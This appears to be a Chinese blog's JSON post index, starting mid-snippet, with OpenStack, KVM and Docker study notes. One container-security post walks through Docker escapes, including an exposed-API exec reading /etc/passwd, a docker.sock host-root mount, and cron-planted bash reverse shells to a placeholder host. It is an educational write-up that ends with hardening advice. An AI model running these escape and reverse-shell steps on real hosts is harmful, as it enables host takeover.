+= 1 if count == 2: return False if nums[i - 1] &gt; nums[i + 1]: nums[i + 1] = nums[i] ##上移 else: nums[i] = nums[i + 1] # 下移 return TruecheckPossibility(nums) True 1","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://example.com/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[]},{"title":"Linux&Docker命令","slug":"Linux&Docker命令","date":"2020-12-04T16:00:00.000Z","updated":"2021-01-17T14:52:01.000Z","comments":true,"path":"2020/12/05/Linux&Docker命令/","link":"","permalink":"http://example.com/2020/12/05/Linux&Docker%E5%91%BD%E4%BB%A4/","excerpt":"一些记不住的Linux和Docker命令。","text":"一些记不住的Linux和Docker命令。 Linux命令1、添加用户 sudo adduser newuser 2、查看文件用户 cat /etc/group 3、查看服务状态 systemctl status 服务 4、删除文件夹 rm -rf 文件夹名 Docker命令1、docker安装 ubuntu apt-get install docker 和apt-get install docker.io 2、docker常用命令 docker images（查看镜像） docker ps（查看正在运行的容器） docker ps -a（查看所有已创建的容器） docker run -dt -p 宿主主机端口：容器端口 镜像 （创建容器并后台运行） docker exec -it 容器ID /bin/bash（进入容器) docker start 容器ID(开启容器) 3、docker与宿主机直接文件互拷贝 参考链接 从容器里面拷文件到宿主机 docker cp 容器名：要拷贝的文件在容器里面的路径 要拷贝到宿主机的相应路径 删除文件夹 rm -rf 从宿主机拷文件到容器里面 docker cp 要拷贝的文件路径 容器名：要拷贝到容器里面对应的路径 示例： **docker cp /home/humen/Desktop/html 73cbd280d965:/var/www/ ** 4、docker容器虚拟机开机自启动 docker update –restart=always 容器id 5. docker build 使用通过dockerfile创建images docker build -t php4fun:v0.1 . /root/mulval","categories":[{"name":"杂","slug":"杂","permalink":"http://example.com/categories/%E6%9D%82/"}],"tags":[]},{"title":"","slug":"OpenStack通用设计思路","date":"2020-07-30T02:10:15.000Z","updated":"2020-07-30T02:10:15.000Z","comments":true,"path":"2020/07/30/OpenStack通用设计思路/","link":"","permalink":"http://example.com/2020/07/30/OpenStack%E9%80%9A%E7%94%A8%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF/","excerpt":"","text":"api每个OpenStack组件可能包含若干子服务，其中必定有一个API服务负责接收客户请求。 设计API前端好处： 对外提供统一接口，隐藏实现细节 提供REST标准调用服务，便于与第三方系统集成 API高可用 scheduler负责从实体中调度最合适的来执行操作 worker前者调度服务只管分配任务，真正执行任务的是worker工作服务。 scheduler和worker的存在使得OpenStack扩展方便： 当计算资源不够无法创建虚拟机时，可以增加计算节点 当客户的请求里太大调度不过来时，可以增加Schedule driverrabbit mqdatabase","categories":[],"tags":[]},{"title":"","slug":"Nova架构","date":"2020-07-30T02:00:58.000Z","updated":"2020-07-30T02:00:58.000Z","comments":true,"path":"2020/07/30/Nova架构/","link":"","permalink":"http://example.com/2020/07/30/Nova%E6%9E%B6%E6%9E%84/","excerpt":"","text":"前言Compute Service Nova 是 OpenStack 最核心的服务，负责维护和管理云环境的计算资源。OpenStack 作为 IaaS 的云操作系统，虚拟机生命周期管理也就是通过 Nova 来实现的。 Nova子服务API接收和响应用户的API调用。 Computer Core计算核心nove-scheduler：虚拟机调度服务，负责决定在哪个计算节点上运行虚拟机。 nova-computer：管理虚拟机的核心服务，通过Hypervisor API实现虚拟机生命周期管理。 Hypervisor：虚拟机管理最底层的程序。 nova-conductor：负责nova-computer更新数据库的任务 Console Interface控制接口nova-console：多种方式可访问虚拟机的控制台 nova-novncproxy 基于Web浏览器的VNC访问 nova-spicehtml5proxy 基于HTML5浏览器的SPICE访问 Nova-xvpncproxy 基于JAVA客户端的VNC访问 nova-consoleauth：提供Token认证 nova-cert：提供x509证书支持 Database数据库nova一些数据存储于名为“nova”的数据库中 Message Queue消息队列RabbitMQ 物理部署Nova主要部署在计算节点和控制节点，利用ps -elf| grep nova来查看运行的nova子服务。 虚拟机创建流程 客户机向API发送请求，API对请求做一些必要的处理后，向Messaging请求让Scheduler创建一个虚拟机，Scheduler获得请求后执行调度算法，从若干计算节点中选出节点A，让Messaging在计算节点A上创建虚拟机，则计算节点A的Hypervisor上启动虚拟机，若此过程需要查询或更新数据库信息，则会通过conductor访问数据库。","categories":[],"tags":[]},{"title":"容器安全概述.md","slug":"容器安全概述","date":"2020-07-21T17:13:24.000Z","updated":"2020-07-28T06:55:21.000Z","comments":true,"path":"2020/07/22/容器安全概述/","link":"","permalink":"http://example.com/2020/07/22/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E6%A6%82%E8%BF%B0/","excerpt":"对网上容器安全特别是Docker安全做一些总结。主要是学习容器逃逸这一方向。","text":"对网上容器安全特别是Docker安全做一些总结。主要是学习容器逃逸这一方向。 内核漏洞：Dirty COW漏洞逃逸Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。 容器服务缺陷：CVE-2019-5736漏洞逃逸1、漏洞原理：Docker、containerd或者其他基于runc的容器在运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者exec操作获取到宿主机runc执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。 (Go脚本)[https://github.com/Frichetten/CVE-2019-5736-PoC] 配置不当引发的docker逃逸docker swarm是管理docker集群的工具。主从管理、默认通过2375端口通信。绑定了一个Docker Remote API的服务，可以通过HTTP、Python、调用API来操作Docker。 通过命令dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375即可在公网访问docker 漏洞利用 列出所有容器，得到id字段http://x.x.x.x:2375/containers/json 创建一个exec12345678910111213POST &#x2F;containers&#x2F;&lt;container_id&gt;&#x2F;exec HTTP&#x2F;1.1 Host: &lt;docker_host&gt;:PORT Content-Type: application&#x2F;json Content-Length: 188 &#123; &quot;AttachStdin&quot;: true, &quot;AttachStdout&quot;: true, &quot;AttachStderr&quot;: true, &quot;Cmd&quot;: [&quot;cat&quot;, &quot;&#x2F;etc&#x2F;passwd&quot;], &quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;, &quot;Privileged&quot;: true, &quot;Tty&quot;: true &#125;&#96;&#96;&#96; 使用burp模拟post请求发包，得到返回的id参数 启动exec，成功执行系统命令，读取到passwd文件/exec//start HTTP/1.112345678Host: &lt;docker_host&gt;:PORTContent-Type: application&#x2F;json&#123; &quot;Detach&quot;: false, &quot;Tty&quot;: false&#125; 在容器内部安装Docker作为client 查看宿主机docker镜像信息docker -H tcp://x.x.x.x:2375 images 启动一个容器并将宿主机根目录挂在到容器的user目录docker -H tcp://x.x.x.x:2375 run -it -v /:/user container_id /bin/bash 写计划任务反弹shellecho &#39;* * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/8877 0&gt;&amp;1&#39; &gt;&gt; /user/var/spool/cron/root 获取宿主机shell docker.sock挂载到容器内部简介Docker采用C/S架构（docker为client，docker daemon为server） 宿主机与docker通信方式有以下三种： unix:///var/run/docker.sock tcp://host:port fd://socketfd 默认通信方式为docker.sock，需要挂载/var/run/docker.sock文件 注：能够访问docker socket或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务可以访问整个主机系统。 漏洞利用 运行一个挂载/var/run/的容器docker run -it -v /var/run/:/host/var/run/container_id /bin/bash 寻找下挂载的sock文件find / -name docker.sock 在容器内安装Docker作为clientapt-get install docker 查看宿主机docker信息docker -H unix:///host/var/run/docker.socker info 运行一个新容器并挂载宿主机根路径docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:14.04 /bin/bash 在新容器/user路径下完成对宿主机资源的访问 写入计划任务文件，反弹shellecho &#39;* * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/9988 0&gt;&amp;1&#39; &gt;&gt; /user/var/spool/cron/root 成功接收到宿主机反弹的shellnc -lvp 9988 特权模式允许容器内的root拥有外部物理机root权限。 使用特权模式启动容器，可以获取大量文件访问权限，执行docker run --privileged时，docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。 当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。 如何保证生产环境中容器的安全？ 对docker宿主机进行安全加固 限制容器之间的网络流量--icc=false 配置docker deamon守护程序的TSL身份验证（Docker程序不能暴露在公网端口） 启动用户命名空间支持 限制容器的内存使用量（创建时添加参数-m） 适当设置容器CPU优先级（防止资源耗尽）","categories":[{"name":"OpenStack","slug":"OpenStack","permalink":"http://example.com/categories/OpenStack/"}],"tags":[]},{"title":"[OpenStack]8-镜像Glance.md","slug":"[OpenStack]8-镜像Glance","date":"2020-07-20T01:02:24.000Z","updated":"2020-07-20T01:48:06.000Z","comments":true,"path":"2020/07/20/[OpenStack]8-镜像Glance/","link":"","permalink":"http://example.com/2020/07/20/[OpenStack]8-%E9%95%9C%E5%83%8FGlance/","excerpt":"OpenStack Glance基础。","text":"OpenStack Glance基础。 ImageOpenStack配置系统流程： 先手工安装好一台虚拟机 然后对虚拟机执行snapshot，因此获得一个images 当建立新的办公环境时，立马启动一个或多个该image的instance虚拟机就可以 snapshot：具备备份作用，能够非常方便的恢复系统。 Image ServiceImage Service功能：管理Image，使得用户能够发现、获取和保存Images。由Glance提供支持，其具备的功能有： 提供REST API让用户能够查询和获取images的元数据和image本身 支持多种方式存储image，包括普通的文件系统、Swift等 对Instance执行Snapshot创建新的images Glance架构 Glance 架构图 图片名词解释： glance-api系统后台运行的服务进程。对外提供REST API，响应image查询、获取和存储的调用。 glance-api不会处理请求。若操作与image metadata（元数据）相关，glance-api会把请求转发给glance-registry；若与image自身存取相关，glance-api会把请求转发给image的store backend。 在控制节点查看glance-api进程 ps -e | grep glance-api galnce-registryDatabaseStore backendGlance操作OpenStack CLITroubleshoot","categories":[{"name":"OpenStack","slug":"OpenStack","permalink":"http://example.com/categories/OpenStack/"}],"tags":[]},{"title":"[OpenStack]7-认证Keystone","slug":"[OpenStack]7-认证Keystone","date":"2020-07-17T07:13:24.000Z","updated":"2020-07-17T07:40:47.000Z","comments":true,"path":"2020/07/17/[OpenStack]7-认证Keystone/","link":"","permalink":"http://example.com/2020/07/17/[OpenStack]7-%E8%AE%A4%E8%AF%81Keystone/","excerpt":"OpenStack Keystone基础。","text":"OpenStack Keystone基础。 Keystone概论Keystone主要工作为： 管理用户及其权限 维护OpenStack Services的Endpoint 认证和鉴权 Keystone主要有以下几个概念： User、Credentials、Authentication、Token、Project、Service、Endpoint、Role ##User 任何使用OpenStack的实体。（可以是真正的用户，或者是其他系统或服务） 当User请求访问OpenStack时，Keystone会对其进行验证。 Horizon在Identity-&gt;Users管理User（缺图） 默认用户除了admin和demo，OpenStack也为nova、cinder、glance、neutron服务创建了响应的User，使得admin可以管理这些User。 CredentialsUser用来证明自己身份的信息。（1. 用户名\\密码 2.Token 3.API Key 4.其他高级方式） AuthenticationKeystone验证User身份的过程。 User访问OpenStack时向Keystone提交用户名和密码形式的Credentials，Keystone验证通过后会给User签发一个Token作为后续访问的Credential。 TokenToken是由数字和字母组成的字符串，User成功Authentication后Keystion生成Token并分配给User。 Token的几点特性 Token用作访问Service的Credential Service会通过Keystone验证Token的有效性 Token的有效期为24小时 ProjectProject用于将OpenStack的资源进行分组和隔离。 Project可以是一个客户（公有云），也可以是项目组（私有云）。 资源的所有权属于Project，而不是user。 每个user必须挂在Project才能访问该Project的资源。 一个User可以属于多个Project。 Horizon在Identity-&gt;Projects管理Project（缺图） 通过Manage Member将User添加到Project（缺图） ServiceService包括计算nova、存储cinder、对象存储swift、磁盘服务glance、网络服务neutron等。 每个Service都会提供若干个Endpoint，User通过Endpoint访问资源和执行操作。 EndpointEndpoint是一个网络上可访问的地址url。 Service通过endpoint暴露自己的API。 Keystone负责管理和维护每个Service的Endpoint。 123# 查看Endpoint命令$ source devstack/openrc admin admin$ openstack catalog list Role安全包括两个部分：认证Authentication和鉴权Authorization Authentication：认证身份 Authorization：权限管理 Keystone通过role实现鉴权Authorization KeyStone定义roleopenstack role list 为User分配一个或者多个 Role。（在Horizon-&gt;Identity-&gt;Project-&gt;Manage Members修改） Service决定每个Role的权限。（通过各自的policy.json进行修改） Keystone工作流程","categories":[{"name":"OpenStack","slug":"OpenStack","permalink":"http://example.com/categories/OpenStack/"}],"tags":[]},{"title":"[OpenStack]6-OpenStack架构以及搭建环境","slug":"[OpenStack]6-OpenStack架构以及搭建环境","date":"2020-07-05T05:44:24.000Z","updated":"2020-07-06T02:42:33.000Z","comments":true,"path":"2020/07/05/[OpenStack]6-OpenStack架构以及搭建环境/","link":"","permalink":"http://example.com/2020/07/05/[OpenStack]6-OpenStack%E6%9E%B6%E6%9E%84%E4%BB%A5%E5%8F%8A%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/","excerpt":"OpenStack架构以及认证、镜像、计算、存储、网络介绍；OpenStack实验环境搭建与部署。","text":"OpenStack架构以及认证、镜像、计算、存储、网络介绍；OpenStack实验环境搭建与部署。 OpenStack架构前面说到作为laaS层的云操作系统，OpenStack为虚拟机提供管理三大类资源：计算、网络、存储。 OpenStack核心 OpenStack架构图 Conceptual Architecture VM：虚拟机 Nova：管理VM的生命周期，是OpenStack中最核心的服务。 Neutron：为OpenStack提供网络连接服务，负责创建和管理L2、L3网络，为VM提供虚拟物理和物理网络连接。 Glance：管理VM启动镜像，Nova创建VM时将使用Glance提供的镜像 Cinder：为VM提供块存储服务。Cinder提供的每一个Volume对于VM来说就是一块虚拟数据盘。 Swift：提供对象存储服务。VM通过RESTful API存放对象数据。Glance可以将镜像存放在Swift中；CInder也可以将Volume备份到Swift中。 Keystone：为OpenStack的各种服务提供认证和权限管理服务。 Cellmeter：提供OpenStack监控和计量服务，为报警、统计或计费提供数据。 Horizon：为OpenStack提供一个Web的自服务Portal。 名称 功能 服务类型 Nova 管理计算资源 核心服务 Neutron 管理网络资源 核心服务 Glance 存储OS镜像 核心服务 Cinder 提供块存储 核心服务 Swift 提供对象存储 可选服务 Keystone 认证服务 核心服务 Ceilometer 监控服务 可选服务 Horizon 操作界面 核心服务 逻辑结构图 Logical Architecture 逻辑结构图，描述的是各服务各个组成部件以及各组件之间的逻辑关系，在实际部署方案上，各个组件可以部署到不同的物理节点上。 之后学习核心服务：Keystone、Glance、Nova、Neutron、Cinder。 搭建实验环境部署拓扑介绍OpenStack是一个分布式系统，由若干个不同功能的节点组成： 节点名称 节点功能 控制节点 管理OpenStack，运行Keystone、Glance、Horizon、Nova和Neutron服务。同时也支持SQL数据库、消息队列和网络时间服务NTP。 网络节点 运行Neutron服务，为OpenStack提供L2和L3网络。包括虚拟机网络、DHCP、路由、NAT等 存储节点 提供CInder或Swift服务。 计算节点 运行Hypervisor（KVM） 注：实际部署时可灵活配置，可以在若干台物理服务器上，也可以在将所有布置在一个虚拟服务器上（ALL-in-One）。 在实验中，我们用两个虚拟机进行部署： devstack-controller：控制节点+网络节点+块存储节点+计算节点 devstack-computer：计算节点 devstack部署示意图 物理资源需求 CPU RAM Storage nic Devstack-controller 1-2 4GB 10GB 3 Devstack-conputer 2-4 8GB 20GB 2 网络规划Management Network：用于OpenStack内部管理使用，各服务之间通信。（eth0） VM Network：OpenStack部署的虚拟机所使用的网络。（eth1） External Network：由于VM Network是内部私有网络，只用于VM之间通信。规划一个External Network，通过devstack-controller的eth2连接。Neutron通过L3服务访问到External Network（Internet）。 配置devstack-controller","categories":[{"name":"OpenStack","slug":"OpenStack","permalink":"http://example.com/categories/OpenStack/"}],"tags":[]},{"title":"[OpenStack]5-云计算与OpenStack","slug":"OpenStack-5-云计算与OpenStack","date":"2020-07-05T04:55:24.000Z","updated":"2020-07-05T05:43:08.000Z","comments":true,"path":"2020/07/05/OpenStack-5-云计算与OpenStack/","link":"","permalink":"http://example.com/2020/07/05/OpenStack-5-%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8EOpenStack/","excerpt":"云计算与OpenStack一些相关知识。","text":"云计算与OpenStack一些相关知识。 基本概念 IT系统架构发展的三个阶段 物理机架构：应用部署和运行在物理机上。规模不大的系统，可以找3台物理机，分别部署Web服务器、应用服务器和数据库服务器；规模再大一点，可以采用集群架构，每个集群成员直接部署在物理机上。物理机架构系统资源使用率很低。 虚拟化架构：物理机上运行若干虚拟机，应用系统直接部署在虚拟机上。虚拟化的好处体现在减少了需要管理的物理机数量，节省维护成本。 云计算架构：虚拟化提高了单台物理机的资源使用率，云计算就是对IT环境中的虚拟机进行统一和高效的管理。 通过云计算平台，建立一个计算（CPU/内存）、存储和网络资源库，当虚拟机的用户需要时，只需向云计算提供该虚拟机的规格，云计算平台从资源库中调出即可，使用者不需要关心虚拟机的各种情况（计算、存储、网络分配）。 云平台是一个面向服务的架构。按照提供服务可以分为laaS、PaaS、SaaS。 云平台服务示意图 laaS（Infrastructure as a Service）：laaS负责管理虚拟机的生命周期（创建、修改、备份、启停、销毁等操作）。使用者只需关心虚拟机的系统、配置，并自己部署上层的中间件和应用。laaS的使用者通常是数据中心的系统管理员。常见的laaS有AWS、Rackspace、阿里云等。 **PaaS(Platform as a Service)**：提供应用的运行环境和一些列中间件服务。使用者只需专注应用的开发，并将自己的应用和数据部署到PaaS环境中。PaaS保证这些服务的可靠性和性能。PaaS的使用者通常是应用的开发人员。常见的PaaS有Heroku、Google APP Engine、IBM BlueMix等。 SaaS（Software as a Service）：提供应用服务。使用者只需登录并使用应用，不需要关注应用的技术和部署细节。SaaS的使用者通常是终端用户。常见的SaaS有Google Gmali、Salesforce等。 OpenStack：OpenStack对数据中心的计算、存储和网络资源进行统一管理。属于laaS层次的云操作系统。","categories":[{"name":"OpenStack","slug":"OpenStack","permalink":"http://example.com/categories/OpenStack/"}],"tags":[]},{"title":"[OpenStack]4-KVM虚拟化原理","slug":"OpenStack-4-KVM虚拟化原理","date":"2020-07-03T05:45:17.000Z","updated":"2020-07-05T04:59:25.000Z","comments":true,"path":"2020/07/03/OpenStack-4-KVM虚拟化原理/","link":"","permalink":"http://example.com/2020/07/03/OpenStack-4-KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E5%8E%9F%E7%90%86/","excerpt":"KVM一些底层原理","text":"KVM一些底层原理 CPU虚拟化利用命令查看CPU是否支持KVM虚拟化 输出带有vmx或svm，就说明当前CPU支持KVM $ egrep -o &#39;(vmx|svm)&#39; /proc/cpuinfo 一个KVM虚拟机就是主机中一个qemu-kvm进程 虚拟机中的每一个虚拟vCPU对应qemu-kvm进程中的一个进程 从上图可以看到，主机有两个物理CPU，有两个虚拟机vm1和vm2。vm1有2个vCPU，vm2有4个vCPU，所有vm1有2个线程，vm2有4个线程在两个物理CPU上调度。 注：虚拟机的vCPU总数可以超过物理CPU数量（CPU overcommit）。这样虚拟机可以充分利用宿主机的CPU资源，前提是所有虚拟机不能在同一时刻都满负荷运行。 内存虚拟化KVM通过内存虚拟机共享物理系统内存，动态分配给虚拟机。 为了能够在一台主机上运行多个虚拟机。KVM实现VA（虚拟内存）-&gt;PA（物理内存）-&gt;MA（机器内存）之间的地址转换。 虚拟OS控制虚拟地址到客户内存物理地址的映射。VA-&gt;PA KVM负责客户物理内存到实际机器内存的映射。PA-&gt;MA 注：内存也可以overcommit。 KVM存储虚拟化KVM存储虚拟化是通过存储池（Storage Pool）和卷（Volume）来管理的。 Storage Pool：主机上可以看到的一片存储空间，可以是多种类型。 Volume：在Storage Pool中划分出的一块空间，主机将Volume分配给虚拟机，Volume在虚拟机视角就是一块硬盘。 下面介绍三种不同类型的Storage Pool： 目录类型的Storage Pool最常用的Storage Pool类型。 KVM将主机目录/var/lib/libvirt/images/作为默认的Storage Pool。（KVM所有可以使用的Storage Pool都定义在主机的/etc/libvirt/storage目录下，每个Pool都一个xml文件，可以查看其默认位置） Volume就是该目录下的文件，一个文件就是一个Volume。 文件cirros***.img就是一个Volume。从KVM1视角来看，就是启动磁盘。 为kvm1添加新的磁盘 新的磁盘信息 使用文件做Volume有很多优点：存储方便、移植性好、可复制、可远程访问。 远程访问：镜像文件不一定都放置到宿主机本地文件系统中，也可以存储在通过网络连接的远程文件系统（NFS\\GlusterFS），使得镜像文件可以在多个主机之间共享，便于虚拟机在不同主机之间做Live Migration。在分布式文件系统中多副本的特性还可以保证镜像文件的高可用性。 KVM支持多种Volume文件格式（raw、qcow2、vmdk） raw：默认格式（原始磁盘镜像格式），移植性好，性能好，但是大小固定，不能节省磁盘空间。 qcow2：推荐格式，cow表示copy on write，能够节省磁盘空间，支持AES加密，zlib压缩，也支持多快照。 vmdk：VMware的虚拟磁盘格式，VMware可以直接在KVM上跑。 LVM类型的Storage Pool主机上VG中的LV可以作为虚拟磁盘分配给虚拟机使用。 LV由于没有磁盘的MBR引导记录，不能作为虚拟机的启动盘，只能作为数据盘使用。 主机的VG就是一个Storage Pool，VG中的LV就是Volume。 优点：拥有较好的性能 缺点：管理和移动性方面不如镜像文件，而且不能通过网络远程使用。 Step1：创建VG。命名为HostVG Step2：创建Storage Pool定义文件Host.xml Step3：通过virsh命令创建新的Storage Pool “HostVG”并启动HostVG Step4：在Virt-manager中为虚拟机KVM1添加LV的虚拟磁盘 Step5：查看主机上多出来的LV 其他类型的Storage PoolKVM 还支持 iSCSI，Ceph 等多种类型的 Storage Pool。目前使用最多的就是目录类型。 网络虚拟化 网络虚拟化中两个最重要的东西：Linux Bridge和VLAN。 Linux Bridge假设主机有1块与外网连接的物理网卡eth0，如何让vm1能够访问外网？ 方案一：直接将物理网卡分配给vm1。但是主机和vm2没有网卡，就不能访问外网了。 方案二：利用Linux Bridge作为中间模块，将eth0与vnet0连接起来。 KVM环境下实现Linux BridgeStep1：配置Linux Bridge br0)（网桥）Step1-1：查看网络脚本目录，只有以太网卡eth0的配置 Step1-2：查看以太网卡ifcfg-eth0的内容 Step1-3：查看当前连接 Step1-4：新建网桥br0并查看ifcfg-br0 Step1-5：查看当前连接 Step1-6：将网桥br0桥接至eth0并查看刚生成的ifcfg-bridge-slave-eth0文件 Step1-7：查看当前连接 Step1-8：关闭eth0，打开网桥br，查看当前连接 Step2：配置VM1 Step2-2：查看VM1 IP地址以及是否能访问外网 Step2-3：查看VM2 IP地址以及是否能访问VM1和外网 理解virbr0virbr0是KVM默认创建的一个Bridge，作用是为连接其上的虚拟机网卡提供NAT外网的功能。 virbr0默认分配了一个IP 192.16.8.122.1，并为连接其他虚拟网卡提供DHCP服务。 virbr0使用dnsmasq提供DHCP服务，可以在祖籍中查看该进程信息 可以通过ssh连接VM1，VM2同理 注：使用NAT的虚拟机可以访问外网，但外网无法直接访问VM1，因为VM1发出的网络包源地址并不是192.168.122.53，而是被NAT替换为主机的IP了。 与br0不同的是：在br0情况下，VM1通过自己的IP直接与外网通信，而不需经过NAT地址转换。 VLANLAN（Local Area Network）本地局域网，通常使用Hub和Switch来连接LAN中的计算机。 一个LAN代表一个广播域。LAN中的所有成员都会收到任意一个成员发出的广播包。 VLAN（Virtual LAN）。VLAN将一个交换机分成了多个交换机，限制了广播的范围，在二层将计算机隔离到不同的VLAN中。 交换机的端口有两种配置模式：Access和Trunk。 Access口：端口打上VLAN标签，表明该端口属于哪个VLAN。利用VLAN ID来区分。Access口都是直接与计算机网卡相连，这样从该网卡出来的数据包流入Access口就被打上VLAN标签。 Trunk口：交换机A、B中都有不同标签的VLAN，利用trunk口将其相连。 KVM环境下实现VLAN（未成功） Brvlan10：Bridge上的其他网络设备自动加入到VLAN10中。 配置解释：主机用软件实现了一个（虚拟）交换机，上面定义了一个VLAN10。eth0.10、brvlan10和vnet0都分别接到VLAN10的Access口。eth0是一个Trunk口。VM1通过vnet0发出来的数据包都会被打上VLAN10的标签。 虚拟交换机（Linux Bridge + VLAN）KVM网络虚拟化总结： VLAN两层功能：交换与隔离。物理交换机存在多个VLAN，每个VLAN拥有多个端口，同一VLAN端口之间可以交换转发，不同VLAN端口之间隔离。 VLAN实现隔离功能。一个VLAN母设备（eth0）不能拥有两个相同的VLAN ID子设备，也就不能出现数据交换情况。 Linux Bridge实现交换功能。将同一VLAN的子设备都挂载到一个Bridge上，设备之间就可以交换数据了。 参考文章 Centos8如何配置网桥 nmcli命令详解","categories":[{"name":"OpenStack","slug":"OpenStack","permalink":"http://example.com/categories/OpenStack/"}],"tags":[]},{"title":"[OpenStack]3.安装&管理KVM实验环境","slug":"OpenStack-3-安装&管理KVM实验环境","date":"2020-06-18T15:58:16.000Z","updated":"2020-07-03T05:43:01.000Z","comments":true,"path":"2020/06/18/OpenStack-3-安装&管理KVM实验环境/","link":"","permalink":"http://example.com/2020/06/18/OpenStack-3-%E5%AE%89%E8%A3%85&%E7%AE%A1%E7%90%86KVM%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83/","excerpt":"安装Ubuntu虚拟机和KVM实验环境。","text":"安装Ubuntu虚拟机和KVM实验环境。 安装KVM步骤一：关闭防火墙和系统增强功能1234[root@localhost &#x2F;]# systemctl stop firewalld[root@localhost &#x2F;]# systemctl disable firewalld[root@localhost &#x2F;]# vi &#x2F;etc&#x2F;selinux&#x2F;config将SELINUX&#x3D;enforcing改为SELINUX&#x3D;disabled，重启计算机生效。 步骤二：安装KVM及其必要组件1[root@localhost &#x2F;]# yum -y install qemu-kvm libvirt libvirt-daemon libvirt-client libvirt-daemon-driver-qemu virt-manager virt-install virt-viewer virt-v2v 软件包介绍： qemu-kvm: 为kvm提供底层仿真支持； libvirt-daemon: libvirtd守护进程，管理虚拟机； libvirt-client: 用户端软件，提供客户端管理命令； libvirt-daemon-driver-qemu: libvirtd连接qemu的驱动 libvirt: 虚拟管理模块； virt-manager: 图形界面管理工具； virt-install: 虚拟机命令行安装工具； virt-v2v: 虚拟机迁移工具； 启动KVM虚拟机virt-manager打开图形化界面 步骤一：新建虚拟机（选择现有镜像） 步骤二：选择镜像默认位置在/var/lib/libvirt/images cirros 是一个很小的 linux 镜像，非常适合测试用. 步骤三：分配CPU和内存默认即可 步骤四：新建名字即配置完成 利用virsh管理虚拟机$ virsh list 远程管理虚拟机virt-manager也可以远程管理其他宿主机上虚拟机。同SSH连接方式，此处不在赘述。","categories":[{"name":"OpenStack","slug":"OpenStack","permalink":"http://example.com/categories/OpenStack/"}],"tags":[]},{"title":"[OpenStack]1.绪论","slug":"OpenStack-1-绪论","date":"2020-06-18T15:04:16.000Z","updated":"2020-06-18T15:17:41.000Z","comments":true,"path":"2020/06/18/OpenStack-1-绪论/","link":"","permalink":"http://example.com/2020/06/18/OpenStack-1-%E7%BB%AA%E8%AE%BA/","excerpt":"打算入门OpenStack以及一些简单地说明。","text":"打算入门OpenStack以及一些简单地说明。 学习目标 系统学习OpenStack：从架构到各个组件，从整体到细节逐一讨论。 重实践并兼顾理论：从实际操作角度来学习OpenStack并理解。 学习难点 OpenStack涉及的知识领域广：涵盖了IT基础设施的所有范围（计算、存储、网络、虚拟化、高可用、安全、灾备）。 OpenStack是一个平台，不是一个具体的实施方案：采用Driver架构，支持各种具体的实现技术。 OpenStack是一个分布式系统。 学习内容 预备知识：虚拟化和云计算的基础知识（KVM、laaS） OpenStack核心：OpenStack的架构和各个核心组件。","categories":[{"name":"OpenStack","slug":"OpenStack","permalink":"http://example.com/categories/OpenStack/"}],"tags":[]},{"title":"[OpenStack]2.虚拟化","slug":"OpenStack-2-虚拟化","date":"2020-06-18T15:04:16.000Z","updated":"2020-06-18T15:58:48.000Z","comments":true,"path":"2020/06/18/OpenStack-2-虚拟化/","link":"","permalink":"http://example.com/2020/06/18/OpenStack-2-%E8%99%9A%E6%8B%9F%E5%8C%96/","excerpt":"学习虚拟化及其技术KVM。","text":"学习虚拟化及其技术KVM。 虚拟化虚拟化是云计算的基础。 虚拟化让一台物理机可以运行多个虚拟机，共享物理机的CPU、内存、IO，但是在逻辑上虚拟机之间是相互隔离的。 注：宿主机Host，虚拟机（客户机）Guest。 通过Hypervisor程序来实现虚拟化。目前有两种虚拟化（1型虚拟化、2型虚拟化） 1型虚拟化Hypervisor直接安装在物理机。多个虚拟机在Hypervisor上运行。（采用此模式有Xen和VMWare的ESXi） 2型虚拟化物理机上安装常规操作系统（Linux、MacOS、WIndows）。Hypervisor作为OS的一个程序运行，并对虚拟机进行管理。（采用此模式有KVM、VirtualBox和VMWare Workstation） 1型与2型虚拟化比较1型虚拟化对硬件虚拟化功能进行了优化，性能比2型好。 2型基于普通操作系统，比较灵活，比如支持虚拟机嵌套。 KVMKVM（Kernel-Based Virtual Machine）是基于Linux内核实现的。KVM是x86平台运行最广泛的虚拟化方案，且OpenStack对KVM支持很好。KVM有个内核模块叫kvm.ko，用于管理虚拟CPU和内存，Linux内核和Qemu来管理存储和网络设备。 KVM管理工具Libvirt作为KVM的管理工具Libvirt除了可以管理Hypervisor（KVM），还能管理Xen、VirtualBox。 注：OpenStack底层也使用Libvirt。 Libvirt三模块 模块 说明 后台daemon程序libvirtd 服务程序，接收和处理API请求 API库 开发基于Libvirt的高级工具（图形化KVM管理工具virt-manager） 命令行工具virsh KVM命令行工具 